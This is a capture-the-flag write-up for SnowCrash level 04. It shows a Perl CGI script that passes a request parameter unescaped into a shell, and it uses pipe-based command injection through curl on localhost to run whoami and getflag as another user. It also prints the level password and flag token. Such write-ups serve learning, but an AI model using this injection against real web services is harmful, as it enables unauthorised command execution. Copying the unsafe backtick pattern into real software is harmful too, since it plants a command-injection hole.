# Level 04 : found flag04

```bash
level03@SnowCrash:~$ su level04
Password: qi0maab88jeaj46qoumi7maus
level04@SnowCrash:~$
```

```bash
level04@SnowCrash:~$ ls
level04.pl
level04@SnowCrash:~$ cat ./level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
level04@SnowCrash:~$ ./
.bash_logout  .bashrc       level04.pl    .profile
level04@SnowCrash:~$ ./
.bash_logout  .bashrc       level04.pl    .profile
level04@SnowCrash:~$ ./level04.pl x=test
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_TERMINAL_VERSION = "3.3.7",
	LC_CTYPE = "UTF-8",
	LC_TERMINAL = "iTerm2",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
Content-type: text/html

test
```

We can execute code, but we stay as the same user.

```bash
level04@SnowCrash:~$ ./level04.pl x=|whoami
[...]
level04
```

But we can connect ourself via curl on `localhost:4747`

```bash
level04@SnowCrash:~$ curl http://localhost:4747?x=\|whoami
flag04
```

Now we are the user `flag04`.\
All we need now is to call `getflag function`. 

```bash
level04@SnowCrash:~$ curl http://localhost:4747?x=\|getflag
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

****************************************

Documentations :
* http://www.ouah.org/hackingcgi.htm